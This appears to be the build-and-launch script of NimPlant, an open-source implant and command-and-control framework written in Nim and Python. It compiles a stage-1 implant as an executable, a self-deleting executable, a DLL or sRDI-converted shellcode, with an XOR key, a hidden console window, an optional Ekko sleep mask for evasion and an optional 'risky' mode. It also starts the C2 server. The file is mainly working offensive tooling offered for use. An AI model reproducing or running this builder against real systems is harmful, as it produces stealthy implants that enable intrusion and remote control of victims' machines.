#!/usr/bin/python3

# -----
#
#   NimPlant - A light-weight stage 1 implant and C2 written in Nim and Python
#   By Cas van Cooten (@chvancooten)
#
#   This is a wrapper script to configure and generate NimPlant and its C2 server
#
# -----

import os
import random
import time
import toml
from pathlib import Path
from client.dist.srdi.ShellcodeRDI import *


def print_banner():
    print(
        """
                  *    *(#    #             
                  **  **(##  ##             
         ########       (       ********    
        ####(###########************,****   
           # ########       ******** *      
           .###                   ***       
           .########         ********       
           ####    ###     ***    ****      
         ######### ###     *** *********    
       #######  ####  ## **  ****  *******  
       #####    ##      *      **    *****  
       ######  ####   ##***   **** .******  
       ###############     ***************  
            ##########     **********       
               #########**********          
                 #######********           
     _   _ _           ____  _             _   
    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_ 
    |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
    | |\  | | | | | | |  __/| | (_| | | | | |_ 
    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|                                  
                                                                                                  
        A light-weight stage 1 implant and C2 written in Nim and Python
        By Cas van Cooten (@chvancooten)
    """
    )


def print_usage():
    print(
        """
    Usage:
        python3 NimPlant.py command [required args] <optional args>

    Acceptable commands:
        compile [exe / exe-selfdelete / dll / raw / all] <nim / nim-debug> <rotatekey>
        server <server name>
    """
    )


def getXorKey(force_new=False):
    if os.path.isfile(".xorkey") and force_new == False:
        file = open(".xorkey", "r")
        xor_key = int(file.read())
    else:
        print("Generating unique XOR key for pre-crypto operations...")
        print(
            "NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!"
        )
        xor_key = random.randint(0, 2147483647)
        file = open(".xorkey", "w")
        file.write(str(xor_key))

    return xor_key


def compile_implant(implant_type, binary_type, xor_key):
    if implant_type == "nim-debug":
        message = "NimPlant with debugging enabled"
        compile_function = compile_nim_debug
    else:
        message = "NimPlant"
        compile_function = compile_nim

    if binary_type == "exe":
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key)
    elif binary_type == "exe-selfdelete":
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key)
    elif binary_type == "dll":
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key)
    elif binary_type == "raw" or binary_type == "bin":
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key)
    else:
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key)
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key)
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key)
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key)


def compile_nim_debug(binary_type, _):
    if binary_type == "exe-selfdelete":
        print("ERROR: Cannot compile self-deleting NimPlant with debugging enabled!")
        print(
            "       Please test with the regular executable first, then compile the self-deleting version."
        )
        print("       Skipping this build...")
        return

    compile_nim(binary_type, _, debug=True)


def compile_nim(binary_type, xor_key, debug=False):
    # Parse config for certain compile-time tasks
    configPath = os.path.abspath(
        os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
    )
    config = toml.load(configPath)

    # Enable Ekko sleep mask if defined in config.toml, but only for self-contained executables
    sleep_mask_enabled = config["nimplant"]["sleepMask"]
    if sleep_mask_enabled and binary_type not in ["exe", "exe-selfdelete"]:
        print("       ERROR: Ekko sleep mask is only supported for executables!")
        print(f"       Compiling {binary_type} without sleep mask...")
        sleep_mask_enabled = False

    # Construct compilation command
    if binary_type == "exe" or binary_type == "exe-selfdelete" or binary_type == "dll":
        compile_command = (
            f"nim c --hints:off --warnings:off -d:xor_key={xor_key} -d:release -d:strip"
        )

        if debug:
            compile_command = compile_command + " -d:verbose"
        else:
            compile_command = compile_command + " --app:gui"

        if os.name != "nt":
            compile_command = compile_command + " -d=mingw"

        if binary_type == "exe":
            compile_command = compile_command + " -o:client/bin/NimPlant.exe"

        if binary_type == "exe-selfdelete":
            compile_command = (
                compile_command + " -o:client/bin/NimPlant-selfdelete.exe -d:selfdelete"
            )

        if binary_type == "dll":
            compile_command = (
                compile_command
                + " -o:client/bin/NimPlant.dll --app=lib --nomain -d:exportDll --passL:-Wl,--dynamicbase --gc:orc"
            )

        if sleep_mask_enabled:
            compile_command = compile_command + " -d:sleepmask"

        # Allow risky commands only if defined in config.toml
        risky_mode_allowed = config["nimplant"]["riskyMode"]
        if risky_mode_allowed:
            compile_command = compile_command + " -d:risky"

        compile_command = compile_command + " client/NimPlant.nim"
        os.system(compile_command)

    elif binary_type == "raw":
        if not os.path.isfile("client/bin/NimPlant.dll"):
            compile_nim("dll", xor_key)
        else:
            # Compile a new DLL NimPlant if no recent version exists
            file_mod_time = os.stat("client/bin/NimPlant.dll").st_mtime
            last_time = (time.time() - file_mod_time) / 60

            if not last_time < 5:
                compile_nim("dll", xor_key)

        # Convert DLL to PIC using sRDI
        dll = open("client/bin/NimPlant.dll", "rb").read()
        shellcode = ConvertToShellcode(dll, HashFunctionName("Update"), flags=0x5)
        with open("client/bin/NimPlant.bin", "wb") as f:
            f.write(shellcode)


if __name__ == "__main__":
    print_banner()

    if not os.path.isfile("config.toml"):
        print(
            "ERROR: No configuration file found. Please create 'config.toml' based on the example configuration before use."
        )
        exit(1)

    if len(sys.argv) > 1:
        if sys.argv[1] == "compile":

            if len(sys.argv) > 3 and sys.argv[3] in ["nim", "nim-debug"]:
                implant = sys.argv[3]
            else:
                implant = "nim"

            if len(sys.argv) > 2 and sys.argv[2] in [
                "exe",
                "exe-selfdelete",
                "dll",
                "raw",
                "bin",
                "all",
            ]:
                binary = sys.argv[2]
            else:
                binary = "all"

            if "rotatekey" in sys.argv:
                xor_key = getXorKey(True)
            else:
                xor_key = getXorKey()

            compile_implant(implant, binary, xor_key)

            print("Done compiling! You can find compiled binaries in 'client/bin/'.")

        elif sys.argv[1] == "server":
            xor_key = getXorKey()
            from server.server import main

            try:
                name = sys.argv[2]
                main(xor_key, name)
            except:
                main(xor_key, "")

        else:
            print_usage()
            print("ERROR: Unrecognized command.")
            exit(1)
    else:
        print_usage()
        exit(1)
